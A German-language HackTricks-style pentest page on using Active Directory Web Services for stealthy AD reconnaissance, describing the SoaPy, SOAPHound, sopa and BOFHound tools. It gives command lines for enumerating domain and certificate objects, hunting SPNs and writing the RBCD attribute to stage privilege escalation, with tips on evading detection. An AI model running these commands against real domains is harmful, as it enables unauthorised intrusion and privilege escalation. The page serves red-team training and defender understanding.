# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Was ist ADWS?

Active Directory Web Services (ADWS) ist seit Windows Server 2008 R2 **standardmäßig auf jedem Domain Controller aktiviert** und lauscht auf TCP **9389**. Trotz des Namens ist **kein HTTP beteiligt**. Stattdessen stellt der Dienst LDAP-ähnliche Daten über einen Stapel proprietärer .NET-Framing-Protokolle bereit:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Weil der Verkehr in diesen binären SOAP-Frames gekapselt ist und über einen ungewöhnlichen Port läuft, ist **Aufklärung über ADWS deutlich weniger wahrscheinlich Gegenstand von Inspektion, Filterung oder Signaturen als klassischer LDAP-/389 & 636-Verkehr**. Für Operatoren bedeutet das:

* Stealthier recon – Blue teams konzentrieren sich oft auf LDAP-Abfragen.
* Möglichkeit, von **non-Windows hosts (Linux, macOS)** zu sammeln, indem man 9389/TCP durch einen SOCKS-Proxy tunnelt.
* Dieselben Daten, die man über LDAP erhält (Users, Groups, ACLs, Schema usw.), sowie die Fähigkeit, **Writes** durchzuführen (z. B. `msDs-AllowedToActOnBehalfOfOtherIdentity` für **RBCD**).

ADWS-Interaktionen werden über WS-Enumeration implementiert: Jede Abfrage beginnt mit einer `Enumerate`-Nachricht, die den LDAP-Filter/Attribute definiert und einen `EnumerationContext`-GUID zurückgibt, gefolgt von einer oder mehreren `Pull`-Nachrichten, die bis zum serverdefinierten Ergebnisfenster streamen. Contexts verfallen nach ~30 Minuten, daher müssen Tools entweder paging verwenden oder Filter aufteilen (Prefix-Abfragen pro CN), um Zustandsverlust zu vermeiden. Wenn man Sicherheitsdeskriptoren anfordert, spezifiziert man die `LDAP_SERVER_SD_FLAGS_OID`-Control, um SACLs auszuschließen, sonst lässt ADWS das `nTSecurityDescriptor`-Attribut einfach aus seiner SOAP-Antwort weg.

> NOTE: ADWS wird auch von vielen RSAT GUI/PowerShell-Tools verwendet, sodass der Traffic mit legitimer Admin-Aktivität verschmelzen kann.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) ist eine **vollständige Neuimplementierung des ADWS-Protokollstapels in purem Python**. Es konstruiert die NBFX/NBFSE/NNS/NMF-Frames Byte-für-Byte und erlaubt die Sammlung von Unix-ähnlichen Systemen ohne das .NET-Runtime zu verwenden.

### Key Features

* Unterstützt **Proxying through SOCKS** (nützlich für C2-Implants).
* Feingranulare Suchfilter identisch zu LDAP `-q '(objectClass=user)'`.
* Optionale **Write**-Operationen ( `--set` / `--delete` ).
* **BOFHound output mode** für direkte Ingestion in BloodHound.
* `--parse`-Flag zum Aufbereiten von Timestamps / `userAccountControl`, wenn menschenlesbare Ausgabe benötigt wird.

### Zielgerichtete Sammel-Flags & Schreiboperationen

SoaPy wird mit kuratierten Schaltern ausgeliefert, die die gängigsten LDAP-Hunting-Aufgaben über ADWS replizieren: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus rohe `--query` / `--filter`-Knobs für benutzerdefinierte Pulls. Kombiniere diese mit Schreibprimitiven wie `--rbcd <source>` (setzt `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN-Staging für gezieltes Kerberoasting) und `--asrep` (setzt `DONT_REQ_PREAUTH` in `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Verwenden Sie denselben Host/Credentials, um Findings sofort zu weaponise: dump RBCD-capable objects mit `--rbcds`, und wenden Sie dann `--rbcd 'WEBSRV01$' --account 'FILE01$'` an, um eine Resource-Based Constrained Delegation chain zu stage (siehe [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) für den vollständigen abuse path).

### Installation (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Sopa - Ein praktischer Client für ADWS in Golang

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **Objektsuche & -abruf** - `query` / `get`
* **Objektlebenszyklus** - `create [user|computer|group|ou|container|custom]` und `delete`
* **Attributbearbeitung** - `attr [add|replace|delete]`
* **Kontoverwaltung** - `set-password` / `change-password`
* und andere wie `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – Hochvolumige ADWS-Sammlung (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ist ein .NET-Collector, der alle LDAP-Interaktionen innerhalb von ADWS hält und BloodHound v4-kompatibles JSON ausgibt. Er erstellt einmalig einen vollständigen Cache von `objectSid`, `objectGUID`, `distinguishedName` und `objectClass` (`--buildcache`) und verwendet diesen dann wieder für hochvolumige `--bhdump`, `--certdump` (ADCS) oder `--dnsdump` (AD-integrated DNS) Durchläufe, sodass nur ~35 kritische Attribute den DC überhaupt verlassen. AutoSplit (`--autosplit --threshold <N>`) teilt Abfragen automatisch nach CN-Präfix, um in großen Forests unter dem 30-minütigen EnumerationContext-Timeout zu bleiben.

Typischer Workflow auf einer domain-joined Operator-VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exportierte JSON-Slots direkt in SharpHound/BloodHound-Workflows — see [BloodHound methodology](bloodhound.md) for downstream graphing ideas. AutoSplit macht SOAPHound gegenüber Forests mit mehreren Millionen Objekten robust, wobei die Anzahl der Abfragen niedriger bleibt als bei ADExplorer-ähnlichen Snapshots.

## Stealth AD-Erfassungs-Workflow

Der folgende Workflow zeigt, wie man über ADWS **domain & ADCS objects** enumeriert, diese in BloodHound JSON konvertiert und nach zertifikatbasierten Angriffswegen sucht – alles von Linux aus:

1. **Tunnel 9389/TCP** vom Zielnetzwerk zu deiner Maschine (z. B. via Chisel, Meterpreter, SSH dynamic port-forward, etc.). Setze `export HTTPS_PROXY=socks5://127.0.0.1:1080` oder verwende SoaPy’s `--proxyHost/--proxyPort`.

2. **Sammle das Root-Domain-Objekt:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Sammle ADCS-bezogene Objekte aus dem Konfigurations-NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **In BloodHound konvertieren:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Lade die ZIP hoch** in der BloodHound GUI und führe Cypher-Abfragen wie `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` aus, um Zertifikats-Eskalationspfade (ESC1, ESC8, etc.) aufzudecken.

### Schreiben von `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombiniere dies mit `s4u2proxy`/`Rubeus /getticket` für eine vollständige **Resource-Based Constrained Delegation**-Kette (siehe [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Zusammenfassung der Tools

| Zweck | Tool | Hinweise |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Konvertiert SoaPy/ldapsearch-Logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Kann über denselben SOCKS-Proxy proxied werden |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generischer Client zur Anbindung an bekannte ADWS-Endpunkte – ermöglicht enumeration, Objekterstellung, Attributänderungen und Passwortänderungen |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
